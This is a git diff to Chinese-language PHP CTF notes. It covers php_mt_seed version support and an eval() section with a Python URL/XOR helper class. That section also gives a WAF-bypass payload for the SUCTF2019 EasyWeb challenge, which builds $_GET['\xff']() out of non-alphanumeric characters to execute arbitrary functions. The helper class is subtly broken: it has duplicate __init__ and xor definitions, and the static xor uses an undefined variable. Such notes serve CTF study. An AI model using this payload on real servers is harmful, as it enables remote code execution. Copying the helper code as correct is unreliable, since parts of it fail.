@@ -27,7 +27,8 @@
 `php_md_seed`是开源项目[Openwall](https://www.openwall.com/php_mt_seed)发布的一款PHP梅森旋转算法的种子爆破工具。
 
 - `PHP < 3.0.6`：使用`php_mt_seed 3.4`
-- `PHP >= 3.0.7`：使用`php_mt_seed 4.0`
+- `7.0.x >= PHP >= 3.0.7`：使用`php_mt_seed 4.0`
+- `PHP >= 8.0`：**暂无适配（做题时一定要考虑PHP版本！）**
 
 ```shell
 $ curl -O https://www.openwall.com/php_mt_seed/php_mt_seed-4.0.tar.gz
@@ -136,7 +137,128 @@ $ make
        sys     0m0.253s
    ```
 
-   
+
+## §1.16 其它基本扩展（Other Basic Extension）
+
+### §1.16.7 杂项函数
+
+#### §1.16.7.7 `eval()`
+
+`eval(string $code)`将`$code`作为PHP代码执行。
+
+预先给出造好的Url编码轮子：
+
+```python
+class UrlCode:
+    
+    def __init__(self) -> None:
+        self.url = []
+
+    def __init__(self,url:str) -> None:
+        self._url = list(url)
+
+    # def __init__(self,ascii:int) -> None:
+    #     self._url = [chr(ascii)]
+
+    def __getitem__(self,key:int) -> str:
+        # return UrlCode.urlencode(self._url[key])
+        return self._url[key]
+
+    def __setitem__(self,key:int,value:str) -> None:
+        if len(value) == 1:
+            self._url[key] = value
+            return
+        raise AttributeError("Not assigned a single character to a char.")
+
+    def append(self,value:str) -> None:
+        self._url += value
+
+    @staticmethod
+    def urlencode(url:str) -> str:
+        result = ''
+        for character in url:
+            result += ('%' + format(ord(character),'x'))
+        return result
+
+    @staticmethod
+    def xor(url_1:'UrlCode',url_2:'UrlCode') -> 'UrlCode':
+        url_xor = UrlCode()
+        length_2 = len(url_2) - 1
+        index_2 = 0
+        for index_1 in range(len(url_1)):
+            url_xor.append(ord(url_1[index_1])^ord(url_2[index_2]))
+            index_2 += 1
+            index %= length_2
+        return url_xor
+
+    def xor(self,url_new:'UrlCode') -> 'UrlCode':
+        length_new = len(url_new)
+        index_new = 0
+        for index_self in range(len(self._url)):
+            self._url[index_self] = chr(ord(self._url[index_self]) ^ ord(url_new[index_new]))
+            index_new += 1
+            index_new %= length_new
+        return self
+
+    def __len__(self) -> int:
+        return len(self._url)
+
+    def __str__(self) -> str:
+        return UrlCode.urlencode(self._url)
+
+url1 = UrlCode("123")
+url2 = UrlCode('\xff')
+print(url1.xor(url2).xor(url2)) # %31%32%33
+print(UrlCode.xor(url1,url2)) # %ce%cd%cc
+```
+
+例如[[SUCTF2019]EasyWeb](https://github.com/team-su/SUCTF-2019/blob/master/Web/easyweb/wp/SUCTF%202019%20Easyweb.md)对`$code`给定下列WAF：
+
+- 字符串长度不得超过18
+- 只许含有`! # $ % ( ) * + - / : ; < > ? @ \ ] ^ { }`与其它非ASCII字符
+- 字符种类数不能大于12
+- 满足上述条件才执行`eval($code)`
+
+可以考虑构造Payload：`$code=$_GET['\xff']();`与`$\xff=phpinfo()`
+
+```python
+url_GET = UrlCode('_GET')
+url_AllXff = UrlCode('\xff\xff\xff\xff')
+url_GET_Xor = url_GET.xor(url_AllXff)
+url_Xff = UrlCode('\xff')
+url = "?_=${" + str(url_AllXff) + '^' + str(url_GET_Xor) + '}{' + str(url_Xff) + '}();&' + str(url_Xff) +'=phpinfo'
+
+print(url) # ?_=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=phpinfo
+```
+
+> 注意：PHP从[7.4.0](https://stackoverflow.com/a/59158847/16366622)开始取消通过花括号获取数组/字符串元素的特性。
+>
+> ```php
+> // PHP < 7.4.0
+> $string = 'abc';
+> echo $string{0}; // a
+> $array = [1, 2, 3];
+> echo $array{0}; // 1
+> 
+> // PHP >= 7.4.0 
+> echo $string[0]; // a
+> echo $array[0]; // 1
+> echo $array{0}; // Deprecated: Array and string offset access syntax with curly braces is deprecated
+> ```
+
+> 注意：PHP从[7.2.0](https://www.php.net/manual/zh/migration72.deprecated.php)开始，当常量不存在时，不再将常量名解析成字符串。
+>
+> ```php
+> // PHP < 7.2.0
+> print(HelloWorld);
+> 	// Warning: Use of undefined constant HelloWorld - assumed 'HelloWorld' (this will throw an Error in a future version of PHP) in %s on line %d
+> 	// 输出HelloWorld
+> 
+> // PHP >= 7.2.0
+> print(HelloWorld);
+> 	// PHP Fatal error:  Uncaught Error: Undefined constant "HelloWorld" in %s:%d
+> 
+> ```
 
 ## §1.20 Session扩展（Session Extensions）
 
